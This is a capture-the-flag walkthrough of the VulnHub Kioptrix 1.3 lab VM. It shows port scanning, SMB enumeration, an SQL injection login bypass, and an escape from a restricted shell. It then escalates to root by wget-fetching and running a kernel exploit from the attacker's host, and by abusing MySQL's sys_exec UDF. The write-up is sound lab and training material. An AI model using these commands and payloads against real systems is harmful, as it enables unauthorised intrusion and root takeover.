# Kioptrix Level 1.3 | VulnHub
https://www.vulnhub.com/entry/kioptrix-level-11-2,23/

### 1. Scan
```bash
kali@kali:~/Desktop/osc/kiol3$ sudo nmap -A -T4 -p- 192.168.34.144
Starting Nmap 7.80 ( https://nmap.org ) at 2020-10-28 05:27 EDT
Nmap scan report for 192.168.34.144
Host is up (0.00073s latency).
Not shown: 39528 closed ports, 26003 filtered ports
PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
| ssh-hostkey: 
|   1024 9b:ad:4f:f2:1e:c5:f2:39:14:b9:d3:a0:0b:e8:41:71 (DSA)
|_  2048 85:40:c6:d5:41:26:05:34:ad:f8:6e:f2:a7:6b:4f:0e (RSA)
80/tcp  open  http        Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
|_http-server-header: Apache/2.2.8 (Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch
|_http-title: Site doesn't have a title (text/html).
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.28a (workgroup: WORKGROUP)
MAC Address: 00:0C:29:6A:43:4C (VMware)
Device type: general purpose
Running: Linux 2.6.X
OS CPE: cpe:/o:linux:linux_kernel:2.6
OS details: Linux 2.6.9 - 2.6.33
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: mean: 10h00m00s, deviation: 2h49m43s, median: 7h59m59s
|_nbstat: NetBIOS name: KIOPTRIX4, NetBIOS user: <unknown>, NetBIOS MAC: <unknown> (unknown)
| smb-os-discovery: 
|   OS: Unix (Samba 3.0.28a)
|   Computer name: Kioptrix4
|   NetBIOS computer name: 
|   Domain name: localdomain
|   FQDN: Kioptrix4.localdomain
|_  System time: 2020-10-28T13:28:22-04:00
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
|_smb2-time: Protocol negotiation failed (SMB2)

TRACEROUTE
HOP RTT     ADDRESS
1   0.73 ms 192.168.34.144

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 67.14 seconds
```
The machine is running SSH, Apache on port 80 and SMB - Samba smbd 3.0.28a. The scripts have also retrieved the domain/FQDN.

### 2. Enumerate SMB
Listing shares (as an anoynomous user):
```bash
kali@kali:~$ smbclient -L \\\\192.168.34.144\\ --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 

        Sharename       Type      Comment
        ---------       ----      -------
        print$          Disk      Printer Drivers
        IPC$            IPC       IPC Service (Kioptrix4 server (Samba, Ubuntu))
Reconnecting with SMB1 for workgroup listing.

        Server               Comment
        ---------            -------

        Workgroup            Master
        ---------            -------
        WORKGROUP            KIOPTRIX4
```
Trying to connect to the shares:
```bash
kali@kali:~$ smbclient \\\\192.168.34.144\\IPC$ --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
Try "help" to get a list of possible commands.
smb: \> ls
NT_STATUS_NETWORK_ACCESS_DENIED listing \*
smb: \> quit
kali@kali:~$ smbclient \\\\192.168.34.144\\print$ --option='client min protocol=NT1'
Enter WORKGROUP\kali's password: 
tree connect failed: NT_STATUS_ACCESS_DENIED
```
No luck. Aside from trying to interact with shares I can check out the actual SMB version and see if there are any vulnerabilities that can be exploited. There are a few, but none of them look very promising.
```bash
kali@kali:~$ searchsploit samba 3.0.
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
 Exploit Title                                                                                                                                                    |  Path
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
Samba 3.0.10 < 3.3.5 - Format String / Security Bypass                                                                                                            | multiple/remote/10095.txt
Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)                                                                                  | unix/remote/16320.rb
Samba 3.0.29 (Client) - 'receive_smb_raw()' Buffer Overflow (PoC)                                                                                                 | multiple/dos/5712.pl
------------------------------------------------------------------------------------------------------------------------------------------------------------------ ---------------------------------
```
After taking a look at these (and attempting the MSF module) and not having any luck, it's time to move on.

### 3. Enumerate web server
The homepage of the web server is a "LigGoat secure Login" page with username and password fields. The 404 error page discloses PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch Server is being used. Using a single quote it is possible to get an SQL error to occur. This means SQL injection may be possible.
Trying a username of "admin" and a payload of `' OR '1'='1` in the password field, the page displays the following:
  
*User admin
Oups, something went wrong with your member's page account.
Please contact your local Administrator
to fix the issue.*
  
I would guess this means the user doesn't exist. After some more probing of the SQL injection point, there does not appear to be any way to retrieve database details to determnine valid users. However, dirbusting the page shows some directories that indicate possible usernames: john and robert.
```bash
kali@kali:~$ gobuster dir -u http://192.168.34.144 --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -t 20
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://192.168.34.144
[+] Threads:        20
[+] Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/10/28 23:00:12 Starting gobuster
===============================================================
/member (Status: 302)
/logout (Status: 302)
/images (Status: 301)
/index (Status: 200)
/john (Status: 301)
/robert (Status: 301)
===============================================================
2020/10/28 23:00:34 Finished
===============================================================
```
Using these usernames with the previous SQL injection payload gets us into the "control panel" for the user, in which there is nothing but the user's password. So I guess now we have two username/password combinations:
- `john:MyNameIsJohn`
- `robert:ADGAdsafdfwt4gadfga==`

### 4. Get a shell
Since there does not appear to be much else to explore with the website, the credentials can be tried to login to SSH.
```bash
ali@kali:~$ ssh john@192.168.34.144
The authenticity of host '192.168.34.144 (192.168.34.144)' can't be established.
RSA key fingerprint is SHA256:3fqlLtTAindnY7CGwxoXJ9M2rQF6nn35SFMTVv56lww.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '192.168.34.144' (RSA) to the list of known hosts.
john@192.168.34.144's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
john:~$ ?
cd  clear  echo  exit  help  ll  lpath  ls
```
Interestingly, this does not appear to be a standard shell. Exiting out to try the other user.
```bash
kali@kali:~$ ssh robert@192.168.34.144
robert@192.168.34.144's password: 
Welcome to LigGoat Security Systems - We are Watching
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
robert:~$
```
Ok same thing.
```bash
robert:~$ cd /
*** forbidden path -> "/"
*** You have 0 warning(s) left, before getting kicked out.
This incident has been reported.
```
Wow ok then. After playing with the commands, we can see where we are (note: it is the same on the other account, we're in that user's home directory.)
```bash
robert:~$ lpath
Allowed:
 /home/robert
```
As this is a restricted shell, ideally I want to spawn something better. A good reference for spawning TTY shells is: https://netsec.ws/?p=337. Immediately I find a method which uses echo, which appears to rely on a python-based environment. Luckily that appears to be the situation.
```bash
john:~$ echo os.system('/bin/bash')
john@Kioptrix4:~$ whoami
john
```

### 5. Enumerate from footholds
Firsly check out the database in case we missed any users:
```bash
john@Kioptrix4:/var/www$ mysql -u root
Welcome to the MySQL monitor.  Commands end with ; or \g.
Your MySQL connection id is 12971
Server version: 5.0.51a-3ubuntu5.4 (Ubuntu)

Type 'help;' or '\h' for help. Type '\c' to clear the buffer.

mysql> show tables;
ERROR 1046 (3D000): No database selected
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema | 
| members            | 
| mysql              | 
+--------------------+
3 rows in set (0.00 sec)

mysql> use members; show tables;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
+-------------------+
| Tables_in_members |
+-------------------+
| members           | 
+-------------------+
1 row in set (0.00 sec)

mysql> select * from members;
+----+----------+-----------------------+
| id | username | password              |
+----+----------+-----------------------+
|  1 | john     | MyNameIsJohn          | 
|  2 | robert   | ADGAdsafdfwt4gadfga== | 
+----+----------+-----------------------+
2 rows in set (0.00 sec)
```
MySQL version:
```bash
john@Kioptrix4:~$ mysql -V    
mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2
```
The operating system and kernel version:
```
robert@Kioptrix4:~$ cat /etc/*-release
DISTRIB_ID=Ubuntu
DISTRIB_RELEASE=8.04
DISTRIB_CODENAME=hardy
DISTRIB_DESCRIPTION="Ubuntu 8.04.3 LTS"

robert@Kioptrix4:/tmp$ cat /proc/version
Linux version 2.6.24-24-server (buildd@palmer) (gcc version 4.2.4 (Ubuntu 4.2.4-1ubuntu4)) #1 SMP Tue Jul 7 20:21:17 UTC 2009
```
Both this version of Ubuntu and MySQL are well over 10 years old. There are a few big kernal exploits that have been discovered since then, one in particular which comes up a lot in searches is the sock_sendpage() NULL dereference for privilege escalation. Prior to this I also tried DirtyCow (https://dirtycow.ninja/), but did not have much luck in any of it's known methods.

### 6. Escalate to root
```bash
john@Kioptrix4:/tmp$ wget http://192.168.34.142:8000/socksploit
--09:33:07--  http://192.168.34.142:8000/socksploit
           => `socksploit'
Connecting to 192.168.34.142:8000... connected.
HTTP request sent, awaiting response... 200 OK
Length: 16,016 (16K) [application/octet-stream]

100%[========================================================================================================================================================>] 16,016        --.--K/s             

09:33:07 (819.51 MB/s) - `socksploit' saved [16016/16016]

john@Kioptrix4:/tmp$ chmod +x socksploit 
john@Kioptrix4:/tmp$ ./socksploit 
# whoami
root
```

## Alternate route
MySQL is also prone to privesc vulnerabilties as it is running as root.
```bash
john@Kioptrix4:~$ ps -aux
Warning: bad ps syntax, perhaps a bogus '-'? See http://procps.sf.net/faq.html
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.8  0.0   2844  1692 ?        Ss   10:17   0:02 /sbin/init
root         2  0.0  0.0      0     0 ?        S<   10:17   0:00 [kthreadd]
...
john      5139  0.0  0.0   1772   484 pts/0    S    10:18   0:00 sh -c /bin/bash
john      5140  0.0  0.1   5432  2832 pts/0    S    10:18   0:00 /bin/bash
root      5171  0.0  0.7 126732 15712 ?        Sl   10:18   0:00 /usr/sbin/mysqld --basedir=/usr --datadir=/var/lib/mysql --user=root --pid-file=/var/run/mysqld/mysqld.pid --skip-external-locking
root      5172  0.0  0.0   1700   556 ?        S    10:18   0:00 logger -p daemon.err -t mysqld_safe -i -t mysqld
john      5209  0.0  0.0   2644  1012 pts/0    R+   10:21   0:00 ps -aux

```
With a library file that gives access to a 'sys_exec' function, commands can be ran as the root user: https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/.
The required library already exists on the system and is actually already loaded:
```bash
john@Kioptrix4:~$ locate lib_mysqludf_sys.so
/usr/lib/lib_mysqludf_sys.so
```
Do a quick test to ensure we are running commands as root:
```bash
mysql> select sys_exec('id > /home/john/test; chown john: /home/john/test'); 
+---------------------------------------------------------------+
| sys_exec('id > /home/john/test; chown john: /home/john/test') |
+---------------------------------------------------------------+
| NULL                                                          | 
+---------------------------------------------------------------+
1 row in set (0.06 sec)

mysql> exit
Bye
john@Kioptrix4:~$ ls
test
john@Kioptrix4:~$ cat test 
uid=0(root) gid=0(root)
```
With root permissions, I can use usermod to add myself to the old admins group and then start an interactive session as root.
```bash
mysql> select sys_exec('usermod -a -G admin john');
ERROR 2006 (HY000): MySQL server has gone away
No connection. Trying to reconnect...
Connection id:    1
Current database: *** NONE ***

+--------------------------------------+
| sys_exec('usermod -a -G admin john') |
+--------------------------------------+
| NULL                                 | 
+--------------------------------------+
1 row in set (0.07 sec)

mysql> exit
Bye
john@Kioptrix4:~$ sudo -s
[sudo] password for john: 
== Welcome LigGoat Employee ==
LigGoat Shell is in place so you  don't screw up
Type '?' or 'help' to get the list of allowed commands
root:~$ echo os.system('/bin/bash')
root@Kioptrix4:~# whoami
root
```